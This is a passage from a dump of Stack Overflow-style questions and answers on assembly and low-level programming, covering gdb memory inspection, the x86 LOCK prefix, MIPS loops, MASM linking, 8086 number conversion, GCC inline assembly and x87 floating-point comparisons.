End of assembler dump.
</code></pre>

<p>The following part is the things that I don't understand. <strong>Please note that $rip is the ""instruction pointer"" and points to</strong> <code>0x000000000040050f &lt;+15&gt;</code></p>

<pre><code>(gdb) x/x $rip
0x40050f &lt;main+15&gt;: 0x00fc45c7
(gdb) x/12x $rip
0x40050f &lt;main+15&gt;: 0x00fc45c7  0xeb000000  0x05c4bf0e  0xbee80040
0x40051f &lt;main+31&gt;: 0x83fffffe  0x8301fc45  0x7e09fc7d  0x0000b8ec
0x40052f &lt;main+47&gt;: 0xc3c90000  0x1f0f2e66  0x00000084  0x1f0f0000
(gdb) x/8xb $rip
0x40050f &lt;main+15&gt;: 0xc7    0x45    0xfc    0x00    0x00    0x00    0x00    0xeb
(gdb) x/8xh $rip
0x40050f &lt;main+15&gt;: 0x45c7  0x00fc  0x0000  0xeb00  0xbf0e  0x05c4  0x0040  0xbee8
(gdb) x/8xw $rip
0x40050f &lt;main+15&gt;: 0x00fc45c7  0xeb000000  0x05c4bf0e  0xbee80040
0x40051f &lt;main+31&gt;: 0x83fffffe  0x8301fc45  0x7e09fc7d  0x0000b8ec
</code></pre>

<p>First command <code>x/x $rip</code> outputs <code>0x40050f &lt;main+15&gt;:   0x00fc45c7</code>. </p>

<p>Is it the instruction at 0x40050f? 
Is <code>0x00fc45c7</code> same as <code>mov    DWORD PTR [rbp-0x4],0x0</code> (assembled instruction at 0x40050f)?</p>

<p>Secondly, if it is the instruction, what are those hex numbers from the output of commands <code>x/12x $rip</code>, <code>x/8xw $rip</code>, <code>x/8xh $rip</code>?</p>
","<p>As to (1), you got that correct.</p>

<p>As to (2), the x command has up to 3 specifiers: how many objects to print; in which format; and what object size. In all your examples you choose to print as hex (x). As to the first specifier, you ask to print 12, 8, 8 objects.  </p>

<p>As to the last specifier in your cases:<br>
x/12x has none, so gdb defaults to assuming you want double words, aka, in 4 byte chunks. Note that you find double word sometimes defined differently, but in intel x86 assembly/gdb, it's 4 bytes. Generally, I'd always specify what exactly you want as opposed to falling back on default settings.    </p>

<p>x/8xw does the same, for 8 objects, as you explicitly requested dwords now.   </p>

<p>x/8xh requests half-word sized chunks of bytes, so objects printed in 2 byte chunks. In case you wonder why the concatenation of two neighboring values does not equal what was reported when you printed in dwords, this is because the x86 is a little-endian architecture. What that means is detailed quite well in erickson's book again - if you look a few pages ahead, he does some calculations you might find helpful. In a nutshell, if you recombine them (2,1) (4,3), ..., you'll see they match.</p>
","20572015"
"Why were old games programmed in assembly when higher level languages existed?","10543","","<p>I noticed that most if not all Nes / Atari, etc games were coded in assembly, however at that time, C, COBOL, and FORTRAN existed which I would think would make it easier to code right? So then why did they choose assembly over these available higher level languages?</p>
","<p>Those games had 8-bit CPU chips and microscopic memories, like, 2kB. This answer would take up over half the RAM.</p>

<p>Compiled code was out of the question.  Even on 8-bit CPU's with ""large"" memories, like ""64K"" (whee!) compiled code was difficult to use; it was not routinely seen until 16-bit microprocessors appeared.</p>

<p>Also, the only potentially useful language was C and it had not yet taken over the world. There were few if any C compilers for 8-bit micros at that time.</p>

<p>But C wouldn't have helped that much. Those games had horribly cheap hacks in them that pretty much required timing-specific instruction loops ... e.g., a sprite's Y-coordinate might depend on WHEN (in the video scan) its control register was written. <em>(Shudder...)</em></p>

<p>Now there <em>was</em> a nice interpreted-bytecode language around that time or perhaps a little bit later: <a href=""http://en.wikipedia.org/wiki/UCSD_Pascal"">UCSD Pascal</a> running on the UCSD P-System. Although I'm not a big Pascal fan, it was way ahead of everything else for those early processors. It wouldn't fit on a game or run fast enough for game play, though.</p>
","4904726"
"x86 LOCK question on multi-core CPUs","10534","","<p>Is it true that the x86 ASM ""LOCK"" command prefix causes all cores to freeze while the instruction following ""LOCK"" is being executed?</p>

<p>I read this in a blog post and it doesn't make sense. I can't find anything that indicates if this is true or not.</p>
","<p>It's about locking the memory bus for that address. <a href=""http://download.intel.com/design/processor/manuals/253668.pdf"" rel=""noreferrer"">The Intel 64 and IA-32 Architectures Software Developer's Manual - Volume 3A: System Programming Guide, Part 1</a> tells us:</p>

<blockquote>
  <p>7.1.4 Effects of a LOCK Operation on Internal Processor Caches.</p>
  
  <p>For the Intel486 and Pentium processors, the LOCK# signal is always
  asserted on the bus during a LOCK
  operation, even if the area of memory
  being locked is cached in the
  processor.</p>
  
  <p>For the P6 and more recent processor
  families, <em>if the area of memory being
  locked during a LOCK operation is
  cached in the processor that is
  performing the LOCK operation as
  write-back memory and is completely
  contained in a cache line, the
  processor may not assert the LOCK#
  signal on the bus</em>. Instead, it will
  modify the memory location internally
  and allow [its] cache coherency
  mechanism to insure that the operation
  is carried out atomically. This
  operation is called ""cache locking.""
  The cache coherency mechanism
  automatically prevents two or more
  processors that have the same area of
  memory from simultaneously modifying
  data in that area. (emphasis added)</p>
</blockquote>

<p>Here we learn that the P6 and newer chips are smart enough to determine if they really have to block off the bus or can just rely on intelligent caching. I think this is a neat optimization.</p>

<p>I discussed this more in my blog post ""<a href=""http://www.moserware.com/2008/09/how-do-locks-lock.html"" rel=""noreferrer"">How Do Locks Lock?</a>""</p>
","3339380"
"What's the best way to learn how to build circuits","10516","","<p>I've always wanted to have a better understanding of what is happening at the hardware level. As a practical level, anything after compile equals 'magic' and I'd like to remedy that.</p>

<p>I'd like to investigate building circuits and then moving up to assembly programming on basic chip sets, both for my own sake and also for my son's, as something we can learn together.</p>

<p>I've looked at some of the ""snap circuit"" kits, but to be honest, they don't interest me.</p>

<p>Suggestions?</p>

<p>Edited Note: Thanks to everyone who responded.</p>
","<p>I would recommend looking at the course <a href=""http://www1.idc.ac.il/tecs/"" rel=""noreferrer"">The Elements of Computing Systems</a>.  Most of the material you need to complete the course is online and the textbook is inexpensive (I paid about 50.00 USD for my copy).</p>

<p>The course takes you through constructing a basic computer system from the NAND gate on up.  All of the labs are done in <a href=""http://www1.idc.ac.il/tecs/software.html"" rel=""noreferrer"">simulation software</a> and it would not be a large stretch of the imagination to convert it to actual hardware (using VHDL).</p>

<p>There is also a Google Tech talk on the the course.</p>

<p><a href=""http://video.google.com/videoplay?docid=7654043762021156507"" rel=""noreferrer"">http://video.google.com/videoplay?docid=7654043762021156507</a></p>

<p>If you want to dive in deeper than digital electronics (logic gates) and learn about analog electronics (the transistors and other components that gates are constructed out of), and the physics behind electricity I recommend <a href=""http://rads.stackoverflow.com/amzn/click/0071377301"" rel=""noreferrer"">Teach Yourself Electricity and Electronics</a></p>
","379225"
"Hello World using x86 assembler on Mac 0SX","10512","","<p>I am trying to dive into some x86 assembly programming on my Mac, but am having trouble producing an executable.  The problem seems to be at the linking stage.</p>

<p>helloWorld.s:</p>

<pre><code>.data

    HelloWorldString:
    .ascii ""Hello World\n""

.text

.globl _start

_start:
    # load all the arguments for write()
    movl $4, %eax
    movl $1, %ebx
    movl $HelloWorldString, %ecx
    movl $12, %edx
    # raises software interrupt to call write()
    int $0x80

    # call exit()
    movl $1, %eax
    movl $0, %ebx
    int $0x80
</code></pre>

<p>Assemble the program:</p>

<pre><code>as -o helloWorld.o helloWorld.s
</code></pre>

<p>Link the object file:</p>

<pre><code>ld -o helloWorld helloWorld.o
</code></pre>

<p>The error I get at this point is:</p>

<pre><code>ld: could not find entry point ""start"" (perhaps missing crt1.o) for inferred architecture x86_64
</code></pre>

<p>Any advice on what I'm doing wrong / missing would be very helpful. thanks</p>
","<p>You'll probably find it easier to build with gcc rather than trying to micro-manage the assembler and linker, e.g.</p>

<pre><code>$ gcc helloWorld.s -o helloWorld
</code></pre>

<p>(You'll probably want to change <code>_start</code> to <code>_main</code> if you go this route.)</p>

<p>Incidentally, it can be instructive to start with a working C program, and study the generated asm from this. E.g.</p>

<pre><code>#include &lt;stdio.h&gt;

int main(void)
{
    puts(""Hello world!\n"");

    return 0;
}
</code></pre>

<p>when compiled with <code>gcc -Wall -O3 -m32 -fno-PIC hello.c -S -o hello.S</code> generates:</p>

<pre><code>    .cstring
LC0:
    .ascii ""Hello world!\12\0""
    .text
    .align 4,0x90
.globl _main
_main:
    pushl   %ebp
    movl    %esp, %ebp
    subl    $24, %esp
    movl    $LC0, (%esp)
    call    _puts
    xorl    %eax, %eax
    leave
    ret
    .subsections_via_symbols
</code></pre>

<p>You might want to consider using this as a template for your own ""Hello world"" or other experimental asm programs, especially given that it already builds and runs:</p>

<pre><code>$ gcc -m32 hello.S -o hello
$ ./hello 
Hello world!
</code></pre>

<p>One final comment: beware of taking examples from Linux-oriented asm books or tutorials and trying to apply them under OS X - there are important differences !</p>
","4289132"
"Integer Arrays in MIPS : Setting array[index] to iteration value i?","10512","","<p>I'm working on translating the below C++ code to MIPS (this is just a small portion of the program that I'm stuck on), and I understand the gist of how to set <code>$t</code> registers to take the array values given, but I'm completely stuck on</p>

<pre><code>pos[count] = i;
</code></pre>

<p>I've tried <code>sw</code>, <code>lw</code>, but everytime I try these, I get address out of range exceptions/etc. </p>

<p>Can someone explain to me what's going wrong here? When the loop gets to <code>pos[count] = i</code>, I need to change <code>pos[count]</code> from <code>0xffffffff</code> to <code>(i)</code> for each loop iteration. Is the error coming because I need to adjust for the -1's in <code>pos[]</code> ?</p>

<p>I'm completely lost and haven't been able to find any explanations that are similar enough to this problem.</p>

<p>(Apologies for the formatting, because MIPS has so many tabbed lines, the formatting for posting here is exceptionally wacky)</p>

<pre><code>    .data
x:  .word   0
    .word   0
    .word   0
    .word   0
    .word   0
    .word   0
    .word   0
    .word   0
    .word   0
    .word   0
pos:    .word   -1
        .word   -1
        .word   -1
        .word   -1
        .word   -1
        .word   -1
        .word   -1
        .word   -1
        .word   -1
        .word   -1
d:      .word   73
        .word   47
        .word   23
        .word   26
        .word   67
        .word   99
        .word   13
        .word   53
        .word   1
        .word   97

sp: .asciiz "" ""
endl:   .asciiz ""\n""

# $s0   count
# $s1   key
# $s2   i

        .text

main:   addi    $s0, $0, 0  #  int count = 0;
        addi    $s1, $0, 24         #  int key = 24;
        addi    $s2, $0, 0
        la  $s3, d
        la  $s4, pos
        la  $s5, x
                       #  for (int i=0; i&lt;10; i++) {
loop:   mul     $t0, $s2, 4 #    if (d[i] &gt;= key) {
        add     $t0, $t0, $s3
        lw  $t0, ($t0)

            blt     $t0, $s1, loop1

            sll     $t1, $s0, 2     # $t1 = count * sizeof(int)
            addu    $t2, $s4, $t1   # $t2 = &amp;pos[count];
            lw      $t2, ($t2)  # $t2 = pos[count];

            add     $t3, $s5, $t1   # $t3 = &amp;x[count];
            lw      $t3, ($t3)  # $t3 = x[count];


            sw    $s2, ($t2)            #      pos[count] = i;
                    #      x[count] = d[i];

loop1:     addi    $s2, $s2, 1     # i++;
           addi    $s0, $s0, 1     # count++;
                    #    }
                    #  }
</code></pre>

<hr>

<p>Here's the C++ code equivalent:</p>

<pre class=""lang-c++ prettyprint-override""><code>#include &lt;iostream&gt;
using namespace std;

int x[10] = {0};
int pos[10] = {-1, -1, -1, -1, -1, -1, -1, -1, -1, -1};
int d[10] = {73, 47, 23, 26, 67, 99, 13, 53, 1, 97};
int main() {

int count = 0;
int key = 24;
for (int i=0; i&lt;10; i++) {
   if (d[i] &gt;= key) {
     pos[count] = i;
     x[count] = d[i];
      count++;
  }
 }

for (int i=0; i&lt;10; i++) {
    if (pos[i] &lt; 0)
      break;
     cout &lt;&lt; pos[i] &lt;&lt; "" "" &lt;&lt; x[i] &lt;&lt; endl;
    }

 }
</code></pre>
","<p>This part is wrong:</p>

<pre><code>lw      $t2, ($t2)  # $t2 = pos[count];
add     $t3, $s5, $t1   # $t3 = &amp;x[count];
lw      $t3, ($t3)  # $t3 = x[count];
sw    $s2, ($t2)    #      pos[count] = i;
</code></pre>

<p>Why are you loading <code>pos[count]</code> and <code>x[count]</code> when you want to write to both? Not only is this unnecessary, it will destroy <code>$t2</code> and <code>$t3</code> so when you really want to write, they will no longer be valid.</p>

<p>Also, the end of the loop is wrong, the <code>count++</code> should be inside the condition. For that you will need to swap the last two lines (including the label).</p>

<p>A slightly cleaned up version could look like:</p>

<pre><code>    .data
x:      .word   0, 0, 0, 0, 0, 0, 0, 0, 0, 0
pos:    .word   -1, -1, -1, -1, -1, -1, -1, -1, -1, -1
d:      .word   73, 47, 23, 26, 67, 99, 13, 53, 1, 97

# $s0   count
# $s1   key
# $s2   i

        .text
.globl main
main:   addi    $s0, $0, 0      #  int count = 0;
        addi    $s1, $0, 24     #  int key = 24;
        addi    $s2, $0, 0      #  int i = 0;
#  for (int i=0; i&lt;10; i++) {
loop:   sll     $t0, $s2, 2     # $t0 = i * sizeof(int)
        lw      $t0, d($t0)     # $t0 = d[i]
        blt     $t0, $s1, loop1 # if (d[i] &lt; key)

        sll     $t1, $s0, 2     # $t1 = count * sizeof(int)
        sw      $s2, pos($t1)   # pos[count] = i
        sw      $t0, x($t1)     # x[count] = d[i]
        addi    $s0, $s0, 1     # count++;

loop1:  addi    $s2, $s2, 1     # i++;
        blt $s2, 10, loop
</code></pre>
","19105127"
"how do i properly link asm files to c++?","10477","","<p>this is a hw problem, ive done all the coding but im having trouble linking the asm with c++, im using windows visual studio 2010, i put the main in source files, and my asm files in the resources files, when i try to compiling it just gives me a linking error</p>

<pre><code>1&gt;------ Build started: Project: clearArray, Configuration: Debug Win32 ------ 
1&gt;clearArray.cpp 
1&gt;clearArray.obj : error LNK2019: unresolved external symbol _clearPointerOp referenced in function _main 
1&gt;clearArray.obj : error LNK2019: unresolved external symbol _clearIndexOp referenced in function _main 
1&gt;C:\Users\Joe Chen\documents\visual studio 2010\Projects\clearArray\Debug\clearArray.exe : fatal error LNK1120: 2 unresolved externals
========== Build: 0 succeeded, 1 failed, 0 up-to-date, 0 skipped ==========
</code></pre>

<p>the objective of this hw was to clear an array using index method and pointer method, then optimize the generated asm code</p>

<p>please help!!!</p>

<p>heres my codes:
main.cpp</p>

<pre><code>// clear array using unoptimized code with index and pointers
#include&lt;iostream&gt;
#include&lt;fstream&gt;
#include""timer.h""

using namespace std;

extern ""C"" {void clearIndexOp(int A[], int size);}
extern ""C"" {void clearPointerOp(int *A, int size);}

const int size = 100000;
int A[size] = {0};

void clearIndex(int A[], int size)
{
    for(int i=0; i&lt;size; i++)
        A[i]=0;
}

void clearPointer(int *A, int size)
{
    int *p;
    for(p=&amp;A[0]; p&lt;&amp;A[size]; p++)
        *p=0;
}

int main()
{   
    double timeIndex = 0;
    double timeIndexOp = 0;
    double timePointer = 0;
    double timePointerOp = 0;
    StopWatch time;
    ofstream myfile;
    myfile.open(""results.txt"");

    for(int n=2000; n&lt;1000000; n=n*2)
    {
        // put values into the array
        for(int i=0; i&lt;size; i++)
            A[i]=i+rand()%10+1;

        time.startTimer();
        clearIndex(A, size);
        time.stopTimer();
        timeIndex =  time.getElapsedTime();

        // put values into the array
        for(int i=0; i&lt;size; i++)
            A[i]=i+rand()%10+1;

        time.startTimer();
        clearPointer(A, size);
        time.stopTimer();
        timePointer = time.getElapsedTime();

        // put values into the array
        for(int i=0; i&lt;size; i++)
            A[i]=i+rand()%10+1;

        time.startTimer();
        clearIndexOp(A, size);
        time.stopTimer();
        timeIndexOp =  time.getElapsedTime();

        // put values into the array
        for(int i=0; i&lt;size; i++)
            A[i]=i+rand()%10+1;

        time.startTimer();
        clearPointerOp(A, size);
        time.stopTimer();
        timePointerOp = time.getElapsedTime();

        myfile &lt;&lt; ""n is now: "" &lt;&lt; n &lt;&lt; ""\n"";
        myfile &lt;&lt; ""timeIndex is: "" &lt;&lt; timeIndex &lt;&lt; ""\n"";
        myfile &lt;&lt; ""timePointer is: "" &lt;&lt; timePointer &lt;&lt; ""\n"";
        myfile &lt;&lt; ""timeIndexOp is: "" &lt;&lt; timeIndexOp &lt;&lt; ""\n"";
        myfile &lt;&lt; ""timePointerOp is: "" &lt;&lt; timePointerOp &lt;&lt; ""\n"";        
    }
    myfile.close();
}
</code></pre>

<p>clearIndexOp.asm</p>

<pre><code>.386
.model flat
.stack
.code

global _clearIndexOp proc
_i$ = -8                            ; size = 4
_A$ = 8                                 ; size = 4
_size$ = 12                             ; size = 4

; {
    push    ebp
    mov ebp, esp
    sub esp, 204                        ; 000000ccH
    push    ebx
    push    esi
    push    edi
    lea edi, DWORD PTR [ebp-204]
    mov ecx, 51                         ; 00000033H
    mov eax, -858993460                 ; ccccccccH
    rep stosd

; for(int i=0; i&lt;size; i++)
; initialize the variables
    mov eax, 0                          ; init i=0 to eax
    mov ebx, DWORD PTR _size$[ebp]      ; size stored in ebx for faster access than memory
    mov ecx, DWORD PTR _A$[ebp]         ; get base addr of array
    jmp SHORT $LN3@clearIndex           ; jump into the loop
$LN2@clearIndex:
    add eax, 1                          ; increase eax since eax=i
$LN3@clearIndex:
    cmp eax, ebx                        ; check that i &lt; size
    jge SHORT $LN4@clearIndex           ; exits if i &gt;= size

; A[i]=0;
    mov DWORD PTR [ecx+eax*4], 0        ; A[i]=0
    jmp SHORT $LN2@clearIndex           ; go back to loop body

; after removing useless/repetitive codes 
; we shrunk this code from 10 instructions to only 5 instructions

$LN4@clearIndex:

; }
    pop edi
    pop esi
    pop ebx
    mov esp, ebp
    pop ebp
    ret 0
_clearIndexOp ENDP              
</code></pre>

<p>clearPointerOp.asm</p>

<pre><code>.386
.model flat
.stack
.code

global _clearPointerOp proc 
_p$ = -8                                    ; size = 4
_A$ = 8                                     ; size = 4
_size$ = 12                                 ; size = 4

; {
    push ebp
    mov ebp, esp
    sub esp, 204                            ; 000000ccH
    push ebx
    push esi
    push edi
    lea edi, DWORD PTR [ebp-204]
    mov ecx, 51                             ; 00000033H
    mov eax, -858993460                     ; ccccccccH
    rep stosd

; int *p;
; for(p=&amp;A[0]; p&lt;&amp;A[size]; p
; initialize the variables
    mov eax, DWORD PTR _A$[ebp]             ; base addr of the array
    mov DWORD PTR _p$[ebp], eax             ; init p = A[0]
    mov ebx, DWORD PTR _p$[ebp]             ; move p to ebx
    mov ecx, DWORD PTR _size$[ebp]          ; size stored in ecx for faster access from register
    lea edx, DWORD PTR [ecx+eax*4]          ; last index of array, A[size-1]
    jmp SHORT $LN3@clearPoint               ; jump into loop
$LN2@clearPoint:
    add eax, 4                              ; since it is pointer we increase eax by 4 to move to next element
$LN3@clearPoint:
    cmp ebx, edx                            ; check that p &lt; size
    jae SHORT $LN4@clearPoint               ; exit if p &gt;= size

; *p=0;
    mov DWORD PTR [ebx], 0
    jmp SHORT $LN2@clearPoint

; after removing useless/repetitive codes
; we shrunk this code from 11 instructions to only 5 instructions

$LN4@clearPoint:

; }
    pop edi
    pop esi
    pop ebx
    mov esp, ebp
    pop ebp
    ret 0
_clearPointerOp ENDP            
</code></pre>
","<p>The problem is your asm is not being treated as a source file. </p>

<p>To fix:</p>

<p>1) Right-click your project and choose Build Customizations, then check the box next to masm</p>

<p>2) Right-click your .asm files, choose Properties, then change the Item Type to Microsoft Macro Assembler.</p>

<p>Edit #2: I see now that you're using a modified version of the asm code generated by VS and it's almost okay.</p>

<p>Just remove ""global"" from the PROC declarations, and then add an END to the end of the asm files.</p>

<p>That should get the asm to assemble and link correctly. But it looks like you probably messed something up in clearPointerOp because it goes into an infinite loop at the end. You should be able to figure it out from there once your code is compiling and linking.</p>
","8162757"
"Coverting String Decimal to Binary and Hexa in Assembly 8086","10467","","<p>I'm trying to convert a string I read with this code to binary and hexa.</p>

<pre><code>READ_STRING:
    MOV DX, offset buffer
    MOV AH, 0Ah
    INT 21h
    MOV SI, 1d
    MOV AX, 0
    XOR CX, CX
    MOV CL, buffer[SI]
    INC SI

LOOP_1:
    MOV DX, 10
    MUL DX
    MOV DL, buffer[SI]
    SUB DL, 30h
    MOV DH, 0
    ADD AX, DX
    INC SI
    LOOP LOOP_1

    RET
</code></pre>

<p>So far I have this code for binary output but it always prints ""1001"" (9 in decimal):</p>

<pre><code>NEXT:

    XOR AX, AX
    XOR BX, BX
    XOR CX, CX
    MOV CL, 2
    MOV AL, byte ptr[nombre]
    MOV DI, offset binaire

; DIV : divide AX by CL. Remainder in AH and result in AL

LOOP:
    DIV CL ; remainder in AH, quotient in AL
    ADD AH, '0' ;  0 -&gt; '0' , 1 -&gt; '1'
    MOV [DI], AH ; Saves the remainder in the array
    INC DI
    MOV AH, 0 ; reset AH for next division
    CMP AL, 0 ; if result is 0, end
    JNE LOOP

;Prints the binary number               
    MOV DX, offset binaire
    CALL WRITE_STRING
</code></pre>

<p>Thanks! If you need anything else just ask.</p>
","<p>Before worrying about whether or not you can display the value as binary or hexadecimal; check to make sure your code correctly converts the user's input into an integer (e.g. with a debugger).</p>

<p>For binary, consider something like this:</p>

<pre><code>    mov bx,ax              ;bx = the value to display as binary
    mov cx,16              ;cx = number of bits to display
    mov di,offset binaire  ;es:di = address to store string

.nextBit:
    xor ax,ax              ;al = 0
    add bx,bx              ;bx = value * 2; carry flag = overflow
    adc al,0               ;al = '0' or '1'
    stosb                  ;Add new character to string
    loop .nextBit
    mov byte [di],0        ;Terminate the string (ASCIIZ?)

    mov dx, offset binaire
    call WRITE_STRING
</code></pre>

<p>For hexadecimal, it's the same basic idea, except you need to extract the highest 4 bits:</p>

<pre><code>    mov bx,ax              ;bx = the value to display as binary
    mov cx,4               ;cx = number of nibbles to display
    mov di,offset binaire  ;es:di = address to store string

.nextNibble:
    mov ax,bx              ;ax = value
    shr ax,12              ;ax = highest 4 bits of value
    shl bx,4               ;bx = value &lt;&lt; 4
    add al,'0'
    cmp al,'9'
    jbe .gotChar
    add al,'A' - '9'
.gotChar:
    stosb                  ;Add new character to string
    loop .nextBit
    mov byte [di],0        ;Terminate the string (ASCIIZ?)

    mov dx, offset binaire
    call WRITE_STRING
</code></pre>

<p>Note 1: I haven't tested any of the code above, and I normally use NASM (not MASM), so it may not assemble ""as is"".</p>

<p>Note 2: Example code above is intentionally simple. For performance you could do a lot better using lookup tables instead.</p>

<p>Note 3: These aren't complex algorithms and you shouldn't need to mess about with high level languages first (unless you don't understand the theory/maths behind binary/hex conversion perhaps). Also, an algorithm that seems elegant in one language can be an ugly mess in another language (e.g. you can't detect overflow in an easy/clean way in C, so the method used for binary conversion above wouldn't be obvious or elegant in C; and a different method that is elegant in C might suck badly in assembly).</p>
","9753322"
"What does the GCC error message, ""Error: unsupported for `mov'"", mean?","10456","","<p>I am just trying to compile some simple example code I typed in from a book, and GCC gives me the above error.  Here's my code:</p>

<pre><code>$ cat -n test.cpp

 1  #define READ_COMMAND    3
 2  
 3  #define MSG_LENGTH  128
 4  
 5  #include &lt;stdlib.h&gt;
 6  #include &lt;stdio.h&gt;
 7  
 8  int main(int argc, char *arg[])
 9  {
10      int syslog_command = READ_COMMAND;
11      int bytes_to_read = MSG_LENGTH;
12      int retval;
13      char buffer[MSG_LENGTH];
14  
15      asm volatile(
16          ""movl %1, %%ebx\n\t""
17          ""movl %2, %%ecx\n\t""
18          ""movl %3, %%edx\n\t""
19          ""movl $103, %%eax\n\t""
20          ""int $128\n\t""
21          ""movl %%eax, %0""
22          :""=r"" (retval)
23          :""m""(syslog_command),""r""(buffer),""m""(bytes_to_read)
24          :""%eax"",""%ebx"",""%ecx"",""%edx"");
25      if (retval &gt; 0) printf(""%s\n"", buffer);
26  
27  }
28  
29  
</code></pre>

<p>The code is supposed to invoke the <code>syslog()</code> system call to read the last 128 bytes from the kernel <code>printk()</code> ring buffer.  Here is some information about my OS and system configuration:</p>

<p><code>uname -a</code>:</p>

<blockquote>
  <p>Linux 3.2.0-26-generic #41-Ubuntu SMP Thu Jun 14 17:49:24 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux</p>
</blockquote>

<p><code>gcc -v</code>:</p>

<pre><code>Using built-in specs.
COLLECT_GCC=gcc
COLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-linux-gnu/4.6/lto-wrapper
Target: x86_64-linux-gnu
</code></pre>

<blockquote>
  <p>Configured with: ../src/configure -v --with-pkgversion='Ubuntu/Linaro 4.6.3-1ubuntu5' --with-bugurl=file:///usr/share/doc/gcc-4.6/README.Bugs --enable-languages=c,c++,fortran,objc,obj-c++ --prefix=/usr --program-suffix=-4.6 --enable-shared --enable-linker-build-id --with-system-zlib --libexecdir=/usr/lib --without-included-gettext --enable-threads=posix --with-gxx-include-dir=/usr/include/c++/4.6 --libdir=/usr/lib --enable-nls --with-sysroot=/ --enable-clocale=gnu --enable-libstdcxx-debug --enable-libstdcxx-time=yes --enable-gnu-unique-object --enable-plugin --enable-objc-gc --disable-werror --with-arch-32=i686 --with-tune=generic --enable-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu</p>
</blockquote>

<pre><code>Thread model: posix

gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) 
</code></pre>

<p>Heres the full error:</p>

<pre><code>$ gcc test.cpp

test.cpp: Assembler messages:

test.cpp:25: Error: unsupported for `mov'
</code></pre>
","<p>You are attempting to compile 32-bit assembly code on a 64-bit machine. The inline assembly you list compiles to:</p>

<pre><code>movl -24(%rbp), %ebx
movl %rsi, %ecx       &lt;--- error here
movl -28(%rbp), %edx
movl $103, %eax
int $128
movl %eax, %r12d
</code></pre>

<p>As you can see, you're attempting to store a 64-bit register in a 32-bit register, which is illegal. More importantly, this isn't the 64-bit ABI system call protocol either.</p>

<p>Try compiling with <code>-m32</code> to force 32-bit ABI.</p>
","11372118"
"Whats wrong with this MIPS/QtSPIM While Loop Code","10453","","<p>The programs runs with expected output but with the errors below</p>

<p><strong>Code</strong></p>

<pre><code>.data

.text
.globl main
main: 
  addi $t0, $t0, 0    # i = 0
  addi $t2, $0, 10    # n = 10
  j WhileCond         # goto WhileCond

  WhileLoop:
    li $v0, 1         # print_int
    move $a0, $t0     # $a0 = i (print i)
    addi $t0, $t0, 1
    syscall

  WhileCond:
    blt $t0, $t2, WhileLoop # if i &lt; 10 goto WhileLoop

  j $ra
</code></pre>

<p><strong>User Text Segment</strong></p>

<pre><code>[00400000] 21080000  addi $8, $8, 0           ; 10: addi $t0, $t0, 0 # i = 0 
[00400004] 200a000a  addi $10, $0, 10         ; 11: addi $t2, $0, 10 # n = 10 
[00400008] 08100007  j 0x0040001c [WhileCond] ; 12: j WhileCond # goto WhileCond 
[0040000c] 34020001  ori $2, $0, 1            ; 15: li $v0, 1 # print_int 
[00400010] 00082021  addu $4, $0, $8          ; 16: move $a0, $t0 # $a0 = i (print i) 
[00400014] 21080001  addi $8, $8, 1           ; 17: addi $t0, $t0, 1 
[00400018] 0000000c  syscall                  ; 18: syscall 
[0040001c] 010a082a  slt $1, $8, $10          ; 21: blt $t0, $t2, WhileLoop # if i 
[00400020] 1420fffb  bne $1, $0, -20 [WhileLoop-0x00400020] 
[00400024] 03e00008  jr $31                   ; 23: j $ra 
</code></pre>

<p><strong>Error</strong></p>

<pre><code>Exception occurred at PC=0x00000000
  Bad address in text read: 0x00000000
Instruction references undefined symbol at 0x800001dc
  [0x800001dc] 0x143a0000  bne $1, $26, 0 [ok_pc-0x800001d8]
</code></pre>
","<pre><code>addi $t0, $t0, 0    # i = 0
</code></pre>

<p>Won't set <code>$t0</code> to 0 but rather leave it unchanged. (<code>move $t0, $zero</code>) or (<code>addi $t0, $0, 0</code>) would both work.</p>

<p>Also are you sure that <code>$t0</code> and <code>$t2</code> are preserved in the syscall?</p>

<p>Lastly the error you posted doesn't appear to occur in your code. Do you have a stack trace/dump of registers or anything else that might help in tracking it down?</p>
","7822108"
"x86 assembler: floating point compare","10442","","<p>As part of a compiler project I have to write GNU assembler code for x86 to compare floating point values. I have tried to find resources on how to do this online and from what I understand it works like this:</p>

<p>Assuming the to values I want to compare are the only values on the floating point stack, then the <code>fcomi</code> instruction will compare the values and set the CPU-flags so that the <code>je, jne, jl,</code> ... instructions can be used.</p>

<p>I'm asking because this only works sometimes. For example: </p>

<pre><code>.section    .data
msg:    .ascii ""Hallo\n\0""
f1:     .float 10.0
f2:     .float 9.0

.globl main
    .type   main, @function
main:
    flds f1
    flds f2
    fcomi
    jg leb
    pushl $msg
    call printf
    addl $4, %esp
leb:
    pushl $0
    call exit
</code></pre>

<p>will not print ""Hallo"" even though I think it should, and if you switch f1 and f2 it still won't which is a logical contradiction. <code>je</code> and <code>jne</code> however seem to work fine. </p>

<p>What am I doing wrong?</p>

<p>PS: does the fcomip pop only one value or does it pop both?</p>
","<p>This is all comming from Volume 2 of <a href=""http://www.intel.com/products/processor/manuals/"" rel=""noreferrer""> Intel 64 and IA-32 Architectures Software Developer's Manuals</a>.</p>

<p><code>FCOMI</code> sets only some of the flags that <code>CMP</code> does. Your code has <code>%st(0) == 9</code> and <code>%st(1) == 10</code>. (Since it's a stack they're loaded onto), referring to the table on page 3-348 in Volume 2A you can see that this is the case ""ST0 &lt; ST(i)"", so it will clear ZF and PF and set CF. Meanwhile on pg. 3-544 Vol. 2A you can read that <code>JG</code> means ""Jump short if greater (ZF=0 and SF=OF)"". In other words it's testing the sign, overflow and zero flags, but <code>FCOMI</code> doesn't set sign or overflow!</p>

<p>Depending on which conditions you wish to jump, you should look at the possible comparison results and decide when you want to jump.</p>

<pre>
+--------------------+---+---+---+
| Comparison results | Z | P | C |
+--------------------+---+---+---+
| ST0 &gt; ST(i)        | 0 | 0 | 0 |
| ST0 &lt; ST(i)        | 0 | 0 | 1 |
| ST0 = ST(i)        | 1 | 0 | 0 |
+--------------------+---+---+---+
</pre>

<p>I've made this small table to make it easier to figure out:</p>

<pre>
+--------------+---+---+-----+------------------------------------+
| Test         | Z | C | Jcc | Notes                              |
+--------------+---+---+-----+------------------------------------+
| ST0 &lt; ST(i)  | X | 1 | JB  | ZF will never be set when CF = 1   |
| ST0 &lt;= ST(i) | 1 | 1 | JBE | Either ZF or CF is ok              |
| ST0 == ST(i) | 1 | X | JE  | CF will never be set in this case  |
| ST0 != ST(i) | 0 | X | JNE |                                    |
